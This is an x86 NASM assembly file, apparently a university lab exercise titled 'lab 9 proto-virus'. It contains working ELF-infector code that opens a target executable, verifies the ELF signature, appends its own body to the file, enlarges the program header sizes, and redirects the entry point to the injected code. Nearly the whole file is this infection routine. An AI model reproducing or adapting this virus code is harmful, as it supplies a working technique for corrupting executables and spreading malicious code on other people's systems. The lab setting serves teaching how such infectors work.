%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define SIZE_OF_ELF_HEADER 52
%define ELF_HEADER_TO_ENTRY 0x18
%define PHDR_OFFSET_FROM_ELF_HEADER 0x1c

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
%define fstat_syscall 0x6c
%define fstat_size 88
%define fstat_to_size 0x14

	global _start

section .text

get_loc_start_func:
	call insert_loc_to_ecx2
insert_loc_to_ecx2:
	pop ecx
	ret

_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;++++++++
	%define fd ebp-4
	%define file_size ebp-8
	%define location_of_insert ebp-12
	%define code_size ebp-16
	%define p_header ebp-STK_RES+PHDR_size
	%define s_top ebp-STK_RES
	;++++++++

	mov dword [s_top], esp

	;write message
	call get_loc
	mov dword [location_of_insert], ecx
	add ecx, 10
	write 0, ecx, 32

	;open the file
	mov ebx, dword [location_of_insert]
	add ebx, 2
	open ebx, RDWR, 0
	mov [fd], eax

	;check open
	cmp dword [fd], 0
	jg cont
		exit 0
cont:
	
	;get the size of the file
	syscall3 fstat_syscall, dword [fd], [s_top], 0
	lea eax, [s_top]
	add eax, fstat_to_size
	mov eax, [eax]
	mov dword [file_size], eax

	;check if it is an elf file
	lseek [fd], 0, SEEK_SET
	lea eax, [s_top]
	read dword [fd], eax, SIZE_OF_ELF_HEADER
	cmp dword [s_top], 0x464c457f
	jne VirusExit

	;write to the end of the file
	lseek [fd], 0, SEEK_END
	call get_loc_start_func
	add ecx, 2
	mov eax, dword [location_of_insert]
	add eax, 0x3c
	;size to wirte
	sub eax, ecx
	mov dword [code_size], eax
	write [fd], ecx, eax
get_phdr:
	;read phdr
	;get the offset from the elf header
	mov eax, [s_top + PHDR_OFFSET_FROM_ELF_HEADER]
	lseek [fd], eax, SEEK_SET
	lea eax, [p_header]
	read dword [fd], eax, PHDR_size
check:
	;new file size
	mov ebx, dword [file_size]
	add ebx, dword [code_size]
	; p_header.filesize = new file size
	mov dword [p_header + PHDR_filesize], ebx
	mov dword [p_header + PHDR_memsize], ebx
	; eax = offset of section
	; compute the offset of the inseted code from the text header
	mov eax, dword [p_header + PHDR_offset]
	mov ecx, dword [file_size]
	sub ecx, eax
	; eax = start virtual address of the program header 
	mov eax, dword [p_header + PHDR_vaddr]
	; compute the virtual address of the inserted code
	add eax, ecx
	; eld_header.entry adress = ecx
	mov dword [s_top + ELF_HEADER_TO_ENTRY], eax

	; write the program header back to the file
	mov eax, [s_top + PHDR_OFFSET_FROM_ELF_HEADER]
	lseek [fd], eax, SEEK_SET
	lea eax, [p_header]
	write dword [fd], eax, PHDR_size

	; write the elf header back to the file
	lseek [fd], ELF_HEADER_TO_ENTRY, SEEK_SET
	lea eax, [s_top + ELF_HEADER_TO_ENTRY]
	write dword [fd], eax, 4

	;close the file
	close [fd], 

; You code for this lab goes here

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)	

get_loc:
	call insert_loc_to_ecx
insert_loc_to_ecx:
	pop ecx
	ret

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes! ", 10, 0
Failstr:        db "perhaps not", 10 , 0
	
PreviousEntryPoint: dd VirusExit
virus_end:


